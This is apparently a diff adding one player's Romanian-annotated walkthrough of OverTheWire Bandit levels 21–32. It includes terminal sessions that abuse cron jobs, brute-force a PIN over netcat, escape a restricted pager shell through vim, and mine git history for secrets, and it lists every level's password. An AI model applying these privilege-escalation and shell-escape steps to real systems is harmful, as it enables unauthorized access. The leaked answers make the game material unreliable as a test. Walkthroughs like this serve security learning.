@@ -1,0 +1,304 @@
+level 21:	Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+		bandit21@bandit:~$ cd  /etc/cron.d/ 
+		bandit21@bandit:/etc/cron.d$ ls
+		cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
+		bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
+		@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+		* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+		bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
+		#!/bin/bash
+		chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+		cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+		bandit21@bandit:/etc/cron.d$ ^C
+		bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+		Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+level 22:	jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+		bandit22@bandit:~$ cd /etc/cron.d
+		bandit22@bandit:/etc/cron.d$ ls
+		cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
+		bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+		@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+		* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+		at /usr/bin/cronjob_bandit23.sh
+		#!/bin/bash
+
+		myname=$(whoami)
+		mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+		echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+		cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+		bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f1
+		8ca319486bfbbc3663ea0fbe81326349
+		bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+		jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+
+level 23:	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+		bandit23@bandit:~$ cd /etc/cron.d/
+		bandit23@bandit:/etc/cron.d$ ls
+		cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
+		bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+		@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+		* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+		bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+		#!/bin/bash
+
+		myname=$(whoami)
+
+		cd /var/spool/$myname
+		echo "Executing and deleting all scripts in /var/spool/$myname:"
+		for i in * .*;
+		do
+   		 if [ "$i" != "." -a "$i" != ".." ];
+  		  then
+        		echo "Handling $i"
+       		 owner="$(stat --format "%U" ./$i)"
+       		 if [ "${owner}" = "bandit23" ]; then
+           		 timeout -s 9 60 ./$i
+       		 fi
+       		 rm -f ./$i
+  		  fi
+		done
+		
+		
+		bandit23@bandit:/etc/cron.d$ mkdir /tmp/vlad
+		bandit23@bandit:~$ cd /tmp/vlad
+		bandit23@bandit:/tmp/vlad$ vim pass.sh
+		bandit23@bandit:/tmp/vlad$ chmod 777 -R /tmp/vlad
+		bandit23@bandit:/tmp/vlad$ cp pass.sh /var/spool/bandit24
+		bandit23@bandit:/tmp/vlad$ ls
+		bandit23@bandit:/tmp/vlad$ cat /tmp/vlad/password
+		UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+level 24 : 	uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+		cd /etc/vlad
+    		cd /tmp/vlad
+    		ls
+    		vim pin.sh
+			#!/bin/bash
+			declare -i i=0
+			while [ $i -le 9999 ]
+			do
+  				if [ $i -gt 999 ]
+    				then
+   				echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+   				fi
+   				let i++
+			done
+	
+    		chmod u+x pin.sh 
+		./pin.sh > rezultate
+   		nc localhost 30002 < rezultate 
+		Correct!
+		The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+level 25 :	5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+		bandit25@bandit:~$ ssh -i bandit26.sshkey -t bandit26@localhost cat ~/text.txt
+		Connection to localhost closed.
+		bandit25@bandit:~$ cat /etc/passwd | egrep bandit26
+		bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+		bandit25@bandit:~$ cat /usr/bin/showtext 
+		#!/bin/sh
+
+		export TERM=linux
+
+		more ~/text.txt
+		exit 0
+
+		#Micsoram terminalul curent pentru a forta executia comenzii more.
+		bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+		#Apas tasta v pt a intra in vim.
+		#Introducem :e /etc/bandit_pass/bandit26
+		5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z 
+
+
+level 26 : 	3ba3118a22e93127a4ed485be72ef5ea
+		#Procedam ca la nivelul anterior
+		#Apasam v pentru a intra in vim; Apasam combinatia shift+,dupa care apasam :
+		#Introducem :set shell=/bin/bash 
+		#Introducem din nou combinatia shift+
+		#introducem :shell
+		
+		bandit26@bandit:~$ ls
+		bandit27-do  text.txt
+		bandit26@bandit:~$ ./bandit27-do 
+		Run a command as another user.
+  		Example: ./bandit27-do id
+		bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+		3ba3118a22e93127a4ed485be72ef5ea
+
+
+level 27 :	0ef186ac70e04ea33b4c1853d2526fa2
+
+		bandit27@bandit:~$ cd /tmp/vlad
+		bandit27@bandit:/tmp/vlad$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+		Cloning into 'repo'...
+		bandit27@bandit:/tmp/vlad$ ls
+		pass.sh  password  pin.sh  repo  rezultate
+		bandit27@bandit:/tmp/vlad$ cd repo
+		bandit27@bandit:/tmp/vlad/repo$ ls
+		README
+		bandit27@bandit:/tmp/vlad/repo$ cat README 
+		The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+
+level 28 :	bbc96594b4e001778eee9975372716b2
+
+		andit28@bandit:~$ mkdir /tmp/vlad1
+		bandit28@bandit:~$ cd /tmp/vlad1
+		bandit28@bandit:/tmp/vlad1$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+		Cloning into 'repo'...
+		bandit28@bandit:/tmp/vlad1/repo$ cat README.md
+		# Bandit Notes
+		Some notes for level29 of bandit.
+
+		## credentials
+
+		- username: bandit29
+		- password: xxxxxxxxxx
+
+		bandit28@bandit:/tmp/vlad1/repo$ git log
+		commit edd935d60906b33f0619605abd1689808ccdd5ee
+		Author: Morla Porla <morla@overthewire.org>
+		Date:   Thu May 7 20:14:49 2020 +0200
+
+ 		   fix info leak
+
+		commit c086d11a00c0648d095d04c089786efef5e01264
+		Author: Morla Porla <morla@overthewire.org>
+		Date:   Thu May 7 20:14:49 2020 +0200
+
+    		add missing data
+
+		commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38
+		Author: Ben Dover <noone@overthewire.org>
+		Date:   Thu May 7 20:14:49 2020 +0200
+
+    		initial commit of README.md
+
+		bandit28@bandit:/tmp/vlad1/repo$ git checkout c086d11a00c0648d095d04c089786efef5e01264
+		bandit28@bandit:/tmp/vlad1/repo$ cat README.md
+		# Bandit Notes
+		Some notes for level29 of bandit.
+
+		## credentials
+
+		- username: bandit29
+		- password: bbc96594b4e001778eee9975372716b2
+
+
+level 29 :	 5b90576bedb2cc04c86a9e924ce42faf
+
+		bandit29@bandit:~$ mkdir /tmp/vlad2
+		bandit29@bandit:~$ cd /tmp/vlad2
+		bandit29@bandit:/tmp/vlad2$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+		Cloning into 'repo'...
+		bandit29@bandit:/tmp/vlad2$ cd repo
+		bandit29@bandit:/tmp/vlad2/repo$ ls
+		README.md
+		bandit29@bandit:/tmp/vlad2/repo$ cat README.md
+		# Bandit Notes
+		Some notes for bandit30 of bandit.
+
+		## credentials
+
+		- username: bandit30
+		- password: <no passwords in production!>
+		
+		bandit29@bandit:/tmp/vlad2/repo$ git branch -a
+		* master
+  		remotes/origin/HEAD -> origin/master
+		remotes/origin/dev
+ 	 	remotes/origin/master
+  		remotes/origin/sploits-dev
+		bandit29@bandit:/tmp/vlad2/repo$ git checkout remotes/origin/dev
+		bandit29@bandit:/tmp/vlad2/repo$ cat README.md
+		# Bandit Notes
+		Some notes for bandit30 of bandit.
+
+		## credentials
+
+		- username: bandit30
+		- password: 5b90576bedb2cc04c86a9e924ce42faf
+
+
+level 30 :	47e603bb428404d265f59c42920d81e5
+		bandit30@bandit:~$ mkdir /tmp/vlad3
+		bandit30@bandit:~$ cd /tmp/vlad3
+		bandit30@bandit:/tmp/vlad3$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+		Cloning into 'repo'...
+		bandit30@bandit:/tmp/vlad3$ cd repo
+		bandit30@bandit:/tmp/vlad3/repo$ ls
+		README.md
+		bandit30@bandit:/tmp/vlad3/repo$ cat README.md
+		just an epmty file... muahaha
+		bandit30@bandit:/tmp/vlad3/repo$ git tag
+		secret
+		bandit30@bandit:/tmp/vlad3/repo$ git show secret
+		47e603bb428404d265f59c42920d81e5
+
+
+level 31 : 	56a9bf19c63d650ce78e6ec0354ee45e
+		bandit31@bandit:~$ mkdir /tmp/vlad4
+		bandit31@bandit:~$ cd /tmp/vlad4
+		bandit31@bandit:/tmp/vlad4$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+		Cloning into 'repo'...
+		andit31@bandit:/tmp/vlad4$ cd repo
+		bandit31@bandit:/tmp/vlad4/repo$ ls
+		README.md
+		bandit31@bandit:/tmp/vlad4/repo$ cat README.md
+		This time your task is to push a file to the remote repository.
+
+		Details:
+  		File name: key.txt
+    		Content: 'May I come in?'
+   		Branch: master
+
+		bandit31@bandit:/tmp/vlad4/repo$ vim key.txt
+		bandit31@bandit:/tmp/vlad4/repo$ cat key.txt
+		May I come in?
+		bandit31@bandit:/tmp/vlad4/repo$ git add key.txt 
+		The following paths are ignored by one of your .gitignore files:
+		key.txt
+		Use -f if you really want to add them.
+		bandit31@bandit:/tmp/vlad4/repo$ ls -a
+		.  ..  .git  .gitignore  key.txt  README.md
+		bandit31@bandit:/tmp/vlad4/repo$ rm .gitignore 
+		bandit31@bandit:/tmp/vlad4/repo$ git commit -m "Commit"
+		[master 5b457cc] Commit
+		1 file changed, 1 insertion(+)
+ 		create mode 100644 key.txt
+		bandit31@bandit:/tmp/vlad4/repo$ git push
+
+		Could not create directory '/home/bandit31/.ssh'.
+		The authenticity of host 'localhost (127.0.0.1)' can't be established.
+		ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+		Are you sure you want to continue connecting (yes/no)? yes
+		Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
+		This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+		bandit31-git@localhost's password: 
+		Counting objects: 3, done.
+		Delta compression using up to 2 threads.
+		Compressing objects: 100% (2/2), done.
+		Writing objects: 100% (3/3), 318 bytes | 0 bytes/s, done.
+		Total 3 (delta 0), reused 0 (delta 0)
+		remote: ### Attempting to validate files... ####
+		remote: 
+		remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+		remote: 
+		remote: Well done! Here is the password for the next level:
+		remote: 56a9bf19c63d650ce78e6ec0354ee45e
+
+
+level 32 :	c9c3199ddf4121b10cf581a98d51caee
+ 		#Dam comanda $0 pentru a putea folosi shellul bash.
+		$ cat /etc/bandit_pass/bandit33
+		c9c3199ddf4121b10cf581a98d51caee
